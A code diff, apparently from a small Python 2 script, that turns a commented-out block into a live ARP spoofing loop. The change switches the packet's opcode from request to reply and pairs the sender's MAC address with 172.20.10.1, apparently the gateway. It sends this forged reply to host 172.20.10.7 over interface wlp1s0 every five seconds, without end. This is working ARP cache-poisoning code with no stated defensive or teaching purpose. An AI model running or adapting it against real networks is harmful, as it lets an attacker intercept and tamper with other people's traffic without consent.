@@ -115,10 +115,9 @@ if reply == '0002': #if it is ARP reply get the Sender HA
 			SENDER_HA.append(int(replay_HA_dt[i:i+2], 16))
 
 		print SENDER_HA
+		
 
-'''
-		while(1):
-			ARP2 =[
+		ARP2 =[
 			struct.pack('!6B',*lst_HA), 
 			struct.pack('!6B',*SENDER_HA),
 			struct.pack('!H',0x0806), #ARP type
@@ -126,7 +125,7 @@ if reply == '0002': #if it is ARP reply get the Sender HA
 			struct.pack('!H',0x0800),
 			struct.pack('!B',0x06),
 			struct.pack('!B',0x04),
-			struct.pack('!H',0x0001),
+			struct.pack('!H',0x0002),
 			struct.pack('!6B',*lst_HA),
 			struct.pack('!4B',172,20,10,1),
 			#struct.pack('!6B',0,194,198,167,34,4),
@@ -134,8 +133,10 @@ if reply == '0002': #if it is ARP reply get the Sender HA
 			struct.pack('!6B',*SENDER_HA),
 			struct.pack('!4B',172,20,10,7) ]
 
+		while(1):
+
+			s.bind(("wlp1s0",0))
 			s.send(b''.join(ARP2))
 			time.sleep(5)
-'''
 
 s.close()
